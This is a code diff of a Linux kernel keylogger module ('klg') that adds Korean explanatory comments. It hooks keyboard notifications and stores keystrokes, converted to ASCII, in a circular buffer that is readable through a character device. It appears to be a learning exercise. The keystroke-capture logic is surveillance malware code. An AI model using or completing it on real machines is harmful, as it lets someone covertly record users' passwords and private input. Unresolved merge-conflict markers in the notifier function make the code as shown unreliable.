@@ -11,14 +11,23 @@ int klg_init(void) {
 
 	/* Registering device */
   	result = register_chrdev(KLG_MAJOR, "klg", &klg_fops);
+  	/*
+  	 * register_chrdev() : 문자장치를 관리하는 chrdev[] 구조체에서 배열을 할당받음.
+  	 *KLG_MAJOR : 배열 chrdev[]의 순서를 결정하는 major 번호
+  	 *"klg" : 등록될 문자 장치
+  	 *&klg_fops : 파일 오퍼레이션을 위한 함수 포인터 
+  	 */
   
-	if (result < 0)
+	if (result < 0)// 할당 실패시.
 		return result;
 
 	register_keyboard_notifier(&nb);
+	//keyboard notifier function을 시작.
 	memset(buffer, 0, sizeof buffer);
+	//buffer를 0으로 초기화.
 
 	printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 
+	//커널 메세지 출력 
 
 	return 0;
 }
@@ -26,11 +35,13 @@ int klg_init(void) {
 void klg_exit(void) {
 	/* Freeing the major number */
 	unregister_chrdev(KLG_MAJOR, "klg");
-
+	//등록된 장치 제거.
 	unregister_keyboard_notifier(&nb);
+	//keyboard notifier function 종료 
 	memset(buffer, 0, sizeof buffer);
+	//buffer 초기화 
 	bptr = buffer;
-
+	//bptr을 buffer로 다시 지정.
 	printk(KERN_DEBUG "[Key logger]: Removing klg module\n");
 
 }
@@ -71,8 +82,9 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 }
 
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
-	struct keyboard_notifier_param *param = _param;
+	struct keyboard_notifier_param *param = _param; //사용자가 입력한 문자를 저장함
 
+<<<<<<< HEAD
 	if (code == KBD_KEYCODE)
 	{
 		if (param->value == 42 || param->value == 54)
@@ -102,6 +114,21 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
 					bptr++;
 					if (bptr == endptr) bptr = buffer;
 				}
+=======
+	if (code == KBD_KEYCODE && param->down) {
+		if (param->value == KEY_BACKSPACE) { //백스페이스일 때
+			if (bptr != buffer) {
+				--bptr;
+				*bptr = '\0'; //bptr에 저장
+			}
+		}
+		else { //백스페이스 아닐 때
+			char ch = get_ascii(param->value); //아스키코드로 변환
+			if (ch != 'X') { //X아니면
+				*bptr = ch; //bptr에 저장하고
+				bptr++; //주소1증가
+				if (bptr == endptr) bptr = buffer; //처음으로 초기화하는건가
+>>>>>>> f1fbcb0b9a1905b119e57916d127f4ae41ddfedd
 			}
 		}
 	}
